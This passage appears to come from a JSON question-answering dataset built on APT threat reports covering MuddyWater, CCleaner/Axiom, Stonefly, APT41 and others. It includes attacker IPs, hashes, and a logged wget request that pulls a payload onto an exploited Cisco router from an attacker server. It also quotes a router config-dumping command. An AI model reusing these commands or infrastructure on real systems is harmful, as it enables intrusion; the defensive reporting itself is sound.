malicious content. The same base URL is employed in both campaigns: hxxp://172.245.81[.]135:10196/Geq5P3aFpaSrK3PZtErNgUsVCfqQ9kZ9/\nHowever, the maldoc appends the additional URL extension\n\"ef4f0d9af47d737076923cfccfe01ba7/layer.jpg\" while the decoy appends \"/Pan-op/gallery.jpg\".\nThis may be a way for the attackers to track their initial infection vector and determine which one is more successful. It is highly likely that the attackers used this server as a token tracker to keep track of successful infections in this campaign. This token-tracking system was then migrated to CanaryTokens in September 2021 in the attacks targeting Turkey using the malicious Excel documents.\nMedium Headline: MuddyWater Middle East campaign using maldocs \u2014 SloughRAT\nDuring a recent IR engagement, Talos observed multiple instances of malicious documents (maldocs) \u2014 specifically XLS files \u2014 distributed by MuddyWater. These XLS files were observed targeting the Arabian peninsula through a recent phishing campaign.\nThe maldoc consists of a malicious macro that drops two WSF files on the endpoint. One of these scripts is the instrumentor script meant to execute the next stage. This instrumentor script is placed in the current user's Startup folder by the VBA macro to establish persistence across reboots.\nThe second script is a WSF-based RAT we call \"SloughRAT\" that can execute arbitrary commands on the infected endpoint. This RAT consists of obfuscated code from interweaved Visual Basic and JavaScript.\nExcel document that drops the Outlook.wsf file.\n\nQuestion: What role do signaling tokens play in MuddyWater's campaigns, and how have they evolved over time?\n\nAnswer:",
    "output": "Signaling tokens play a crucial role in MuddyWater's campaigns as a means for the attackers to track their initial infection vectors and determine which ones are more successful. Initially, MuddyWater used a homemade implementation of signaling tokens, where maldocs and decoy documents reached out to a common server to download a common image file that linked them. This token-tracking system was later migrated to CanaryTokens, a legitimate service, to make their operations appear less suspicious. This evolution shows a progression from homemade solutions to more professional implementations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Next Connection\nStarting from the stage 2 payload, I reverse engineered the module, extracting other hidden shellcode and binaries within. After uploading the different binaries to (<http://www.intezer.com/intezer-analyze/>)Intezer Analyze\u2122, the final payload (that I have access to) had a match with a binary relating to the Axiom group.\nBinary in screenshot:\nf0d1f88c59a005312faad902528d60acbf9cd5a7b36093db8ca811f763e1292a\nRelated APT17 samples:\n07f93e49c7015b68e2542fc591ad2b4a1bc01349f79d48db67c53938ad4b525d 0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2 20cd49fd0f244944a8f5ba1d7656af3026e67d170133c1b3546c8b2de38d4f27 ee362a8161bd442073775363bf5fa1305abac2ce39b903d63df0d7121ba60550\nNot only did the first payload have shared code between the Axiom group and CCBkdr, but the second did as well. The above photo shows the same function between two binaries. Let me put this into better context for you: out of all the billions and billions of pieces of code (both trusted and malicious) contained in the Intezer Code Genome Database, we found this code in only these APTs. It is also worth noting that this isn't a standard method one would use to call an API. The attacker used the simple technique of employing an array to hide a string from being in clear sight of those analyzing the binary (although to those who are more experienced, it is obvious) and remain undetected from antivirus signatures. The author probably copied and pasted the code, which is what often happens to avoid duplicative efforts: rewriting the same code for the same functionality twice.\nDue to the uniqueness of the shared code, we strongly concluded that the code was written by the same attacker.\nBig Headline: Technical Analysis:\nThe stage two payload that was analyzed in this report (dc9b5e8aa6ec86db8af0a7aa897ca61db3e5f3d2e0942e319074db1aaccfdc83), after launching the infected version of CCleaner, was dropped to only a selective group of targets, as reported by Talos. Although there is an x64 version, the following analysis will only include the x86 version because they are nearly identical. I will not be going too far in depth as full comprehension of the technical analysis will require an understanding of reverse engineering.\nInstead of using the typical API (VirtualAlloc) to allocate memory, the attackers allocated memory on the heap using LocalAlloc, and then copied a compressed payload to the allocated memory.\nIt looks like the attackers used version 1.1.4 of zlib to decompress the payload into this allocated memory region.\nDepending on if you're running x86 or x64 Windows, it will drop a different module. (32-bit\n07fb252d2e853a9b1b32f30ede411f2efbb9f01e4a7782db5eacf3f55cf34902, 64-bit 128aca58be325174f0220bd7ca6030e4e206b4378796e82da460055733bb6f4f) Both modules are actually legitimate software with additional code and a modified execution flow.\nThe last modified time on the modules is changed to match that of the msvcrt.dll that is located in your system32 folder\u2013a technique to stay under the radar by not being able to check last modified files.\nSome shellcode and another module are written to the registry.\nAfter the module is successfully dropped, a service is created under the name Spooler or SessionEnv, depending upon your environment, which then loads the newly dropped module.\nThe new module being run by the service allocates memory, reads the registry where the other payload is located, and then copies it to memory.\nThe next payload is executed, which decrypts another module and loads it. If we look at the memory of the next decrypted payload, we can see something that looks like a PE header without the MZ signature. From here, it is as simple as modifying the first two bytes to represent MZ and we have a valid PE file. (f0d1f88c59a005312faad902528d60acbf9cd5a7b36093db8ca811f763e1292a)\nThe next module is a essentially another backdoor that connects to a few domains; before revealing the true IP, it will connect to for the next stage payload.\nIt starts by ensuring it receives the correct response from (<https://www.microsoft.com/>)https://www.microsoft.com and (<https://update.micrsoft.com/>)https://update.microsoft.com.\nThe malware proceeds to decrypt two more URLs.\nThe malware authors used steganography to store the IP address in a ptoken field of the HTML.\nHere you can see the GitHub page with the ptoken field.\nThe value is then XOR decrypted by 0x31415926 which gives you 0x5A093B0D or the IP address: 13.59.9.90\nBig Headline: About Intezer:\nThrough its 'DNA mapping' approach to code, Intezer provides enterprises with unparalleled threat detection that accelerates incident response and eliminates false positives, while protecting against fileless malware, APTs, code tampering and vulnerable software.\nCurious to learn what's next for Intezer? Join us on our journey toward achieving these endeavors here on the blog or (<https://intezer.viewpage.co/free-community-edition>)request a community free edition invite\n\nBased on the above text, answer a question. What methods did the attackers use to allocate memory and deploy the payload in the stage two attack of the CCleaner hack, and how did they ensure the payload remained hidden?",
    "output": "The attackers allocated memory on the heap using LocalAlloc instead of the typical API VirtualAlloc, and then copied a compressed payload to the allocated memory. They used version 1.1.4 of zlib to decompress the payload into this allocated memory region. To ensure the payload remained hidden, the attackers modified the last modified time on the modules to match that of the msvcrt.dll located in the system32 folder. Additionally, some shellcode and another module were written to the registry, and a service was created under the name Spooler or SessionEnv to load the newly dropped module.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: OUTlOOK FOR CHINA-BASED ADvERSARIES\nChina is, by now, well known for conducting cyber espionage campaigns focused on accessing intelligence about intellectual property, mergers and acquisitions, and technologies highlighted in its Five-year plans. Targeting these technologies and strategic business information allow its domestic companies to rapidly make \"leap frog\" developments, and to benefit from favorable bargaining positions, thus elevating them to become global leaders. This behavior is expected to continue in 2015, as will continued targeting of foreign government entities in an attempt to access information related to the global strategy and plans of these countries.\nChina is expected to continue to leverage this espionage as a means to conduct intelligence collection to support its aspirations to further push the envelope on its territorial claims. This is particularly true in the South China Sea (SCS) conflicts with Vietnam and the Philippines, and the Senkaku/Diaoyu island dispute with Japan. China has already undertaken substantial construction of manmade islands in the SCS to begin projecting its power, and as its Navy continues to grow, it will only seek to push further beyond its current boundaries. China is aggressively moving forward with the design and implementation of its own aircraft carriers, which will no doubt have an impact in this regional issue, allowing the PRC to project force and intimidate its neighbors.\nLooking Forward\nTaiwan will continue to play a very important role in the potential conflicts to come, not only as a testing ground for malware, but as the main focus for expanding Chinese territorial claims. The PRC views Taiwan as an inalienable part of China that will eventually be reunited for the greater good of both peoples and therefore places it above other territorial conflicts. Taiwan's recent shift towards a decidedly less-Beijing-friendly, DPP-led government is of great concern to China and will be a major factor in how China uses technology to facilitate its political maneuverings. Taiwan has historically been penetrated by PRC intelligence services  at all levels, which makes cyber one of the first visible indicators of PRC intentions regarding Taiwan.\nChina has also made significant headway on projecting its \"soft power\" abroad via multiple billion-dollar investments, particularly in the sectors of communications and transportation infrastructure. For years, China has been making inroads in Africa to provide the vast majority of the continent's telecommunication systems, but only recently have some of the more sinister intentions been brought to light.\nIn December 2014, approximately 77 Chinese nationals were found to be running a sophisticated command center out of a house in Nairobi, Kenya, which appeared to be capable of targeting the main communication systems in the capital. A building with multiple large satellites that appears to be annexed to the Chinese embassy in Paris was also recently reported  on and believed to be connected to the 3PLA's 8th Bureau, Unit 61046, which is responsible for SIGINT collection on western europe.\nLooking Forward\nThere has also been a significant amount of investment poured into transportation projects, particularly high-speed rail (HSR) lines, in multiple countries. China has already planned to merge its two top train makers into a HSR juggernaut capable of building massive rail lines around the world. To this end, China has submitted bids for massive rail projects in Nigeria, and nearly won (this was subsequently canceled) another project in Mexico. China has also suggested massive lines between Beijing and Moscow and constructing a line between Delhi and Chennai in India. Beijing also remains interested in proposals for HSRs in Britain and California, and has already made headway on construction of a Hungary-Serbian HSR that will connect Belgrade to Budapest.\nIn total, the projects proposed by China would give it control of more than 40,000 km, giving it significant control over the world's transportation routes. It seems fairly likely that, given China's previous use of espionage against foreign companies (which it has used to gain advantages in competitive bidding and mergers & acquisitions), there is a substantial motivation for China to follow suit in the coming year as it looks to secure its position as the global leader in HSR construction.\nSmall Headline: jOINT PlAN OF ACTION COUlD POSSIBlY DRIvE IRANIAN CYBER ATTACKS\nThe Iranian Joint Plan of Action (JPOA), its delay, and its ultimate desired path by politicians to negotiate a Comprehensive Plan of Action (CPOA) are preeminent issues in the global press and political circles. The JPOA is a temporary agreement made between Iran and an intergovernmental negotiating body consisting of China, France, the Russian Federation, the Un\u00dfited Kingdom, the United States and Germany. The agreement was originally intended to be a six-month period in which the Iranian government would reduce its stockpile of enriched uranium fuel and suspend specific aspects of its nuclear energy programs in exchange for the UN Security Council relaxing of specific sanctions previously imposed against Iran. During this time of suspended nuclear research activities and\nLooking Forward\neased sanctions, negotiating parties would discuss the details of a more permanent agreement, known as the Comprehensive Plan of Action (CPOA).\nThe JPOA could be a driver or tipping point for future cyber attacks by Iran against western targets. Iran has publicly noted the understanding that negotiations can be influenced and has demonstrated historically that it is willing (and has capabilities) to conduct cyber operations to influence negotiations if it sees fit to do so. It has been publicly speculated that Iran has conducted retaliatory attacks, notably the Shamoon incident in 2012.\nRecent open-source activities in the Iranian underground suggest Iran may be attempting to structure or resource for possible future cyber operations. There have been visibility changes with regard to information surrounding Iranian hackers, as well as forums and websites. Popular forums for Iranian hackers ISCN and Shabgard have been shut down and are no longer publicly accessible. Despite the shutdowns, there will likely be little change to the communication occurring between affiliated hackers in closed communications pathways. The closing of these forums could be in anticipation of future malicious activity and a desire to decrease the public profile of individuals in the Iranian underground.\nThere are also clear links between the Iranian government hacking contests intended to identify hackers with advanced skills and to learn advanced methods of network intrusion. For example, in November 2013, just before the JPOA agreement was signed, Sharif University of Technology conducted a contest for \"innovative methods\" of computer network intrusions and defense against such intrusions. Based on the contest announcements, Iranian government cyber security authorities had access to the students' submissions in the contest, and those submissions were not released to the public but rather kept private to only those with access to the contest submissions.\nLooking Forward\nIranian adversaries such as ROCKeT KITTeN, FLyING KITTeN, and CHARMING KITTeN were quite active during 2014 targeting western governments and companies. The motivation to attack such targets will only increase during 2015. However, should the process around the JPOA and CPOA take a turn that Iran perceives as disadvantageous, the motivation will likely greatly increase. Recent revelations indicate that ROCKeT KITTeN may have, in fact, targeted the JPOA negotiations using spear phishing that may have targeted diplomats involved in the meetings.\n\nWhat role does Taiwan play in China's cyber espionage activities, and how might the shift in Taiwan's government impact China's approach?",
    "output": "Taiwan plays a crucial role in China's cyber espionage activities, serving both as a testing ground for malware and as a primary focus for China's territorial ambitions. The PRC views Taiwan as an integral part of China and seeks eventual reunification. Taiwan's recent shift towards a less Beijing-friendly, DPP-led government is a significant concern for China. Given Taiwan's historical penetration by PRC intelligence services, cyber activities will likely be among the first visible indicators of China's intentions regarding Taiwan. This shift in government could influence how China uses technology to facilitate its political maneuverings.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: History of ambitious attacks\nStonefly (aka DarkSeoul, BlackMine, Operation Troy, and Silent Chollima) first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U.S. government, and financial websites.\nIn recent years, the group's capabilities have grown markedly and, since at least 2019 Symantec has seen its focus shift solely to espionage operations against select, high-value targets. It now appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. Stonefly's operations appear to be part of a broader North Korean-sponsored campaign to acquire information and intellectual property, with Operation Dream Job, a more wider-ranging trawl across multiple sectors, being carried out by another North Korean group, Pompilus.\nBig Headline: Latest target\nThe most recent attack discovered by Symantec, a division of , was against an engineering firm that works in the energy and military sectors. The attackers breached the organization in February 2022, most likely by exploiting the (<https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/apache-log4j-zero-day>)Log4j vulnerability\n(CVE-2021-44228) vulnerability on a public-facing VMware View server. The attackers then moved across the network and compromised 18 other computers.\n17 hours later: Shortly after compromising the initial server, the attackers installed an updated version of Stonefly's Backdoor.Preft malware (aka Dtrack, Valefor). The attackers (<https://www.putty.org/>)then used a masqueraded version (file name: pvhost.exe) of application, presumably to exfiltrate data from the infected machine. Shortly after PSCP was executed, the credential-dumping tool Mimikatz (masquerading under the file name pl.exe) was run.\nDay 2: Malicious activity resumed when (<https://github.com/3proxy/3proxy>)3proxy tiny proxy server, a publicly available proxy tool (file name: svhost.exe) was executed. Use of this tool continued for the next four days. A second suspected proxy tool was installed two days into this four day period (file name: tapi.exe). Several hours afterwards, a copy of the Preft backdoor (file name: svchost.exe) was installed. Two days later, , an open-source SSH file-transfer tool was used, presumably to exfiltrate or upload data to the compromised computer.\nDay 3: The next phase of the intrusion began on the following day, when Preft was executed (<https://github.com/Kevin-Robertson/Invoke-TheHash>)and the attackers began moving latterly across the organization's network, using , a publicly available PowerShell pass-the-hash utility (file name: rev.ps1), and wmiexec.py, (<https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py>)a publicly available Impacket tool used to run WMI commands (file name: notepad.exe).\nBig Headline: Updated Preft backdoor\nThe attackers used an updated version of Stonefly's custom Preft backdoor. Analysis of the backdoor revealed that it is a multistage tool:\nStage 1 is the main binary. A python script is used to unpack the binary and shellcode.\nStage 2 is shellcode. It performs the following actions:\nSleeps for 19,999 seconds, probably in an attempt to evade sandbox detection\nOpens a mutex, with the name specified in the Stage 3 shellcode\nInstead of loading an executable file, it starts Internet Explorer (iexplore.exe) or explorer.exe and injects the Stage 3 shellcode into either. It sets up a named pipe (\"\\.\\pipe\\pipe\") for communication. The file name of the main binary is sent over the pipe.\nStage 3 is more shellcode.\nStage 4 is the payload. It is an HTTP remote access tool (RAT) that supports various commands, including:\n1. Download (Download a file and save locally)\n2. Upload (Upload a file to a C&C server)\n3. Set Interval (Change C&C server query interval - in minutes)\n4. Shell Execute (Execute a command in the shell)\n5. Download Plugin\n6. Update (Download a new version and replace)\n7. Info (Return debug information about the current infection)\n8. Uninstall\n9. Download Executable\nThe malware can support four different kinds of plugins: executable files, VBS, BAT, and shellcode. It supports three different persistence modes: Startup_LNK, Service, Registry, and Task Scheduler.\nBig Headline: Custom information stealer\nAlong with the Preft backdoor, Stonefly also deployed what appears to be a custom developed information stealer (infostealer). Analysis of this malware revealed that it is a three-staged threat. The main binary extracts and decrypts the encrypted shellcode with a modified RC4 algorithm.\nStage 2 is shellcode which retrieves the payload and decrypts it with the same modified RC4 algorithm. The decrypted payload is an executable file that is loaded in-memory. It is designed to search the infected computer for files using pre-configured parameters. These are then copied to temporary files before being copied to a single .zip file and the temporary files are removed. The ZIP file path is %TEMP/~[XXXXXXXX].tmp, where XXXXXXXX is a simple hash of the computer name (eight uppercase hex digits).\nCuriously, this ZIP file is not automatically exfiltrated. It is possible that the exfiltration functionality was removed and the attackers planned to use an alternative means of exfiltration.\nAnswer this question: How did Stonefly leverage the Log4j vulnerability (CVE-2021-44228) in their latest attack, and what subsequent steps did they take to compromise additional systems within the network?",
    "output": "Stonefly exploited the Log4j vulnerability (CVE-2021-44228) on a public-facing VMware View server to gain initial access. After breaching the server, they installed an updated version of their Backdoor.Preft malware (also known as Dtrack or Valefor). They then used a masqueraded version of the PSCP application (file name: pvhost.exe) to potentially exfiltrate data. Following this, the credential-dumping tool Mimikatz (masquerading under the file name pl.exe) was executed. On the second day, they used the 3proxy tiny proxy server (file name: svhost.exe) and another suspected proxy tool (file name: tapi.exe). Additionally, they installed a copy of the Preft backdoor (file name: svchost.exe) and used an open-source SSH file-transfer tool, likely for further data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: ANDROID TROJAN\nModifiedElephant also sent multiple phishing emails containing both NetWire and Android malware payloads at the same time. The Android malware is an unidentified commodity trojan delivered as an APK file (). While the Android trojan bears marks of being designed for broader cybercrime, its delivery at the same time as ModifiedElephant Netwire samples indicates that the same attacker was attempting to get full coverage of the target on both endpoint and mobile.\nFig 6: ModifiedElephant Phishing email with malicious attachments for Netwire and Android GM Bot variants.\nFig 7: ModifiedElephant Phishing email with malicious attachments for Netwire and Android GM Bot variants.\nThe trojan enables the attackers to intercept and manage SMS and call data, wipe or unlock the device, perform network requests, and remote administration. In a very basic form, the trojan provides the attackers with an ideal low-cost mobile surveillance toolkit.\nMedium Headline: RELATIONS TO OTHER THREAT CLUSTERS\nOur research into this threat actor reveals multiple interesting threads that highlight the complex nature of targeted surveillance and tasking, where multiple actors swoop in with diverse mechanisms to track the same group of individuals. These include private sector offensive actors (PSOAs) and groups with possible commercial facades to coordinate their illicit activities.\nBased on our analysis of ModifiedElephant, the group operates in an overcrowded target space and may have relations with other regional threat actors. From our visibility, we can't further disambiguate the shape of that relationship\u2013whether as part of an active umbrella organization, cooperation and sharing of technical resources and targets across threat groups, or simply coincidental overlaps. Some interesting overlaps are detailed below.\n\u2022 Multiple individuals targeted by ModifiedElephant over the years have also been either targeted or confirmed infected with mobile surveillance spyware.  identified NSO Group's Pegasus being used in targeted attacks in 2019 against human rights defenders related to the Bhima Koregaon case. Additionally, the Bhima Koregaon case defendant Rona Wilson's iPhone was targeted with Pegasus since 2017 based on a  of an iTunes backup found in the forensic disk images analyzed by Arsenal Consulting.\n\u2022 Between February 2013 and January 2014 one target, Rona Wilson, received phishing emails that can be attributed to the SideWinder threat actor. The relationship between ModifiedElephant and SideWinder is unclear as only the timing and targets of their phishing emails overlap within our dataset. This could suggest that the attackers are being provided with similar tasking by a controlling entity, or that they work in concert somehow.  targeting government, military, and business entities primarily throughout Asia.\n\u2022 ModifiedElephant phishing email payloads () share infrastructure overlaps (new-agency[.]us) with . Operation Hangover includes surveillance efforts against targets of interest to Indian national security, both foreign and domestic, in addition to industrial espionage efforts against organizations around the world.\n\u2022 Another curious finding is the inclusion of the string \"Logs from Moosa's\" found in a keylogger sample closely associated with ModifiedElephant activity in 2012 (). The string could be a reference to Moosa Abd-Ali Ali, the Bahrain activist . Without greater information, we treat this as a low confidence conjecture in need of greater research.\n\nBased on the above text, answer a question. How does the use of an Android trojan by ModifiedElephant enhance their surveillance capabilities, and what specific functionalities does this trojan provide?",
    "output": "The use of an Android trojan by ModifiedElephant enhances their surveillance capabilities by providing a low-cost mobile surveillance toolkit. This trojan allows the attackers to intercept and manage SMS and call data, wipe or unlock the device, perform network requests, and enable remote administration. By delivering this trojan alongside NetWire samples, ModifiedElephant aims to achieve full coverage of the target on both endpoint and mobile devices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 1 Metric for Cyber Attack\nThe conflict in Ukraine has challenged fundamental elements of Western alliance strategy. Russian efforts exploit a general reluctance by the West \u2013 natural in democracies \u2013 to risk war. The West has been unable to deter Russia from its adventure.\nCyber warfare has played only a limited role in this. The concepts of strategic and military effect provide us with two metrics for assessing the effect of cyber attacks generally, and for Russian cyber activities in Ukraine. Strategic effect would be to diminish the opponent's will or capacity to resist. This can include politically coercive cyber actions such as were used against Estonia. Military effect would be degradation in the performance of commanders, troops, and weapons, demonstrated by U.S. actions in its Middle Eastern conflicts or as part of the 2007 Israeli airstrike in Syria1 .\nCyber attacks that produce strategic or military effect can include the manipulation of software, data, knowledge, and opinion to degrade performance and produce political or psychological effect. Introducing uncertainty into the minds of opposing commanders or political leaders is a worthy military objective. Manipulating public opinion to damage an opponent's legitimacy and authority in both domestic and international audiences is also valuable. Some actions may provide only symbolic effect aimed at a domestic audience, but this too is valuable for a nation in conflict.\n1 David Makovsky. 'The Silent Strike: How Israel bombed a Syrian nuclear installation and kept it secret,' The New Yorker, 17 September 2012, http://www.newyorker.com/magazine/2012/09/17/the-silent-strike.\nTo assess non-kinetic effect as a contributor for strategic or military advantage, we must look for observable effects in three categories: creating confusion, shaping opinion, and inflicting damage to data or services. Using these metrics, we can conclude that Russian cyber efforts in Ukraine produced an early tactical effect that has since tapered off and, since they are limited to actions that do not produce physical or disruptive consequences, have largely failed to achieve strategic or military effect.\nSmall Headline: 2 Strategic and Military Effect\nThe Ukraine conflict has been described as hybrid warfare; a mixture of unconventional tactics and strategies, irregular forces, covert action, cyber operations, and political manipulation to achieve strategic goals. In essence, hybrid warfare is a collection of tactics designed to circumvent deterrence and avoid military retaliation by skirting the threshold of what could be considered state use of armed force. In this new style of conflict, non-kinetic actions can be as important as kinetic attacks. Hybrid warfare highlights the central problem for our understanding and management of interstate conflict; conventional warfare is now only part of a larger range of coercive actions available to nations.\nCyber capabilities create an operational space in which nations can conduct offensive action with less political risk.\nCyber operations \u2013 the ability to remotely manipulate computer networks \u2013 have created a capability that is well suited to this new political-military environment. Cyber capabilities create an operational space in which nations can conduct offensive action with less political risk, given the grey area in international law which cyber war inhabits, and where opponents can find it difficult to respond. Advanced cyber action can create physical effects equivalent to kinetic attack, but we should not interpret cyber capabilities solely from the perspective of physical effect.\nWhile cyber attacks can produce effects similar to kinetic weapons, there is an informational aspect involving the manipulation of opinion and decision-making that is equally important and much more frequently used. Cyber attack can produce results equivalent to kinetic attack, but this is not its primary effect, which (at least for now) is to manipulate data, knowledge, and opinion to produce political or psychological effect rather than physical damage. Introducing uncertainty into the minds of opposing commanders or political leaders is a worthwhile military goal, as it will cause them to make mistakes or to become hesitant, providing the attacker with dominance of the battle space and the advantage of putting the defender in a reactive posture. Cyber actions that manipulate public opinion to\naffect an opponent's legitimacy and authority are also valuable in conflict among states.\nCyber attack creates an operational space for coercive action that avoids many of the political risks of kinetic warfare. Cyber attacks are attractive in that they offer varying degrees of covertness and their treatment under international law remains ambiguous in regard to whether they qualify as an 'armed attack' that would legiti-mise retaliation. Although cyber tools and techniques can be used in harmful ways, they are not weapons per se, which can make it difficult to decide when a cyber incident can be considered an armed attack or a use of force.\nAn initial effort to define how a cyber incident could qualify as a use of force or armed attack would be to consider that an effect of the cyber action was the equivalent of an attack using conventional weapons producing physical destruction or casualties. A cyber incident that produced injury or death to persons and the destruction of or damage to property would certainly be considered as a use of force or armed attack. A cyber attack that produced intangible effects of such scope, intensity, and duration that they are judged to have consequences or harmful effects of sufficient scale and gravity could also be considered an armed attack.\nNo Russian action in Ukraine rises to this level. Overall, the use of offensive cyber capabilities for kinetic effect has been minimal, with only a few known incidents. Russia is one of the most skilled among the nations who have developed cyber capabilities, but we have not seen extensive use of actual attacks against Ukraine. Neither critical infrastructure nor Ukrainian weapons have been damaged or disrupted. Russia has used its cyber capabilities primarily for political coercion, opinion-shaping, and intelligence gathering, and these cyber operations fall below the threshold set in Article V of the North Atlantic Treaty. Operations in Estonia, Georgia, and now Ukraine suggest that NATO may need to adjust its thinking about how opponents will use cyber attacks.\nRussia has been relatively careful in the overt use of its own forces \u2013 especially compared to its actions against Georgia where the Russian Ministry of Defence confirmed that Russian armoured units were engaged in combat for 'peace enforcement'. The Russian army occupied Georgian territory and Russian aircraft bombed targets including the capital.2 Russian actions in Ukraine took a different course. The current caution may reflect lessons learned in Georgia or a desire to preserve some degree of deniability, and manoeuvring to avoid an overt violation of international law.\nCyber attack does not require 'an act of violence to compel our opponent to fulfil our will'. 3 Violence through cyber means is possible, but that is not the only or even primary use of cyber attack. Its effects are more often intangible and\ninformational, and are intended to manipulate data, create uncertainty, and shape opinion. An emphasis on kinetic effect can obscure important operational distinctions in the use of cyber techniques and complicates efforts to develop norms for cyber conflict.\n2 Library of Congress, Russian Federation: Legal Aspects of War in Georgia, http://www.loc.gov/law/help/russian-georgia-war. php.\n3 Clausewitz's definition of war.\nRead the text above and answer this question: What are the three observable effects used to assess non-kinetic cyber attacks as contributors to strategic or military advantage, and how have Russian cyber efforts in Ukraine fared according to these metrics?",
    "output": "The three observable effects used to assess non-kinetic cyber attacks are creating confusion, shaping opinion, and inflicting damage to data or services. According to these metrics, Russian cyber efforts in Ukraine produced an early tactical effect that has since tapered off. Since these actions did not produce physical or disruptive consequences, they have largely failed to achieve strategic or military effect.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How can APT groups like FANCY BEAR utilize Search Open Technical Databases: WHOIS to gather information about their targets and facilitate spearphishing campaigns?",
    "output": "Search Open Technical Databases: WHOIS allows adversaries to gather publicly available information about registered domains, such as assigned IP blocks, contact information, and DNS nameservers. APT groups like FANCY BEAR can leverage this information to identify potential vulnerabilities and facilitate targeted attacks. For instance, they can use WHOIS data to identify the registrant of a domain, creation date, and name server used during the attack timeframe, as seen in the case of the domains evrosatory[.]com and us-westmail-undeliversystem[.]com, which were previously identified as FANCY BEAR infrastructure. By analyzing WHOIS records, FANCY BEAR can also identify potential targets, such as Bellingcat researchers, and craft spearphishing emails that appear to come from legitimate sources, increasing the likelihood of successful credential harvesting. Furthermore, WHOIS data can be used to identify operational resources, such as Yandex mail servers, which were used to send malicious emails in the FANCY BEAR campaign. Overall, Search Open Technical Databases: WHOIS is a valuable tool for APT groups like FANCY BEAR to gather information and facilitate targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Waterbug leverage custom loaders and backdoors in their first campaign, and what specific techniques did they employ to maintain persistence and avoid detection?",
    "output": "In the first campaign, Waterbug used two versions of a custom loader named javavs.exe (64-bit) and javaws.exe (32-bit) to load a custom backdoor named PhotoBased.dll and run the export function GetUpdate on the victim's computers. The backdoor modified the registry for the Windows Media Player to store its C&C configuration and reconfigured the Microsoft Sysinternals registry to prevent pop-ups when running the PsExec tool. The backdoor had the capability to download and upload files, execute shell commands, and update its configuration. Additionally, the javaws.exe loader was used to run another loader named tasklistw.exe, which decoded and executed a series of malicious executables that downloaded Meterpreter to the infected computer. Another backdoor was installed to run a command shell via the named pipe cmd_pipe, allowing the attackers to execute various commands for full control of the victim's system. Waterbug also used an older version of PowerShell to avoid logging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nTaiwan and the Philippines have become the targets of an ongoing campaign called \"Operation Tropic Trooper.\" Active since 2012, the attackers behind the campaign have set their sights on the Taiwanese government as well as a number of companies in the heavy industry. The same campaign has also targeted key Philippine military agencies. Though the motivations behind the operation are still unclear, the tools and tactics used reveal potential areas of weakness both countries should look into.\nOperation Tropic Trooper took advantage of two of the most-exploited Windows\u00ae vulnerabilities to date\u2014 CVE-2010-3333 and CVE-2012-0158\u2014to infiltrate their chosen networks. Part of its success could be attributed to the use of basic steganography or image file attachments laced with malicious code, combined with clever social engineering.\nThis research paper provides in-depth technical information on Operation Tropic Trooper's targets, components, tools, and tactics.*\n* Special thanks to Ronnie Giagone for additional analyses and insights.\nOperation Tropic Trooper\nQ: How did Operation Tropic Trooper leverage specific Windows vulnerabilities and steganography to successfully infiltrate networks, and what broader implications does this have for cybersecurity strategies?",
    "output": "Operation Tropic Trooper utilized two well-known Windows vulnerabilities, CVE-2010-3333 and CVE-2012-0158, to gain access to targeted networks. These vulnerabilities were exploited through the use of steganography, where malicious code was hidden within image file attachments. This approach, combined with effective social engineering techniques, allowed the attackers to bypass traditional security measures. The broader implications of this tactic highlight the importance of keeping systems patched against known vulnerabilities and the need for robust defenses against social engineering attacks. Additionally, it underscores the necessity for advanced threat detection mechanisms that can identify and mitigate threats embedded in seemingly innocuous files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Cisco Router Exploitation\nOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named 'fuc' (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module (<https://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv32x_rce>)that combines two CVE's ( and ) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.\nGET /test/fuc\nHTTP/1.1\nHost: 66.42.98\\.220\nUser-Agent: Wget\nConnection: close\nFigure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget\n66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: c0c467c8e9b2046d7053642cc9bdd57d) is 'cat /etc/flash/etc/nk_sysconfig', which is the command one would execute on a Cisco RV320 router to display the current configuration.\nCisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action:\nBig Headline: Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)\nOn March 5, 2020, researcher (<https://twitter.com/steventseeley/status/1235635108498948096?s=20>)Steven Seeley, published (<https://srcincite.io/advisories/src-2020-0011/>)an advisory and released (<https://srcincite.io/pocs/src-2020-0011.py.txt>)proof-of-concept code for a zero-day (<https://nvd.nist.gov/vuln/detail/CVE-2020-10189>)remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho\nManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload \"logger.zip\", a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and 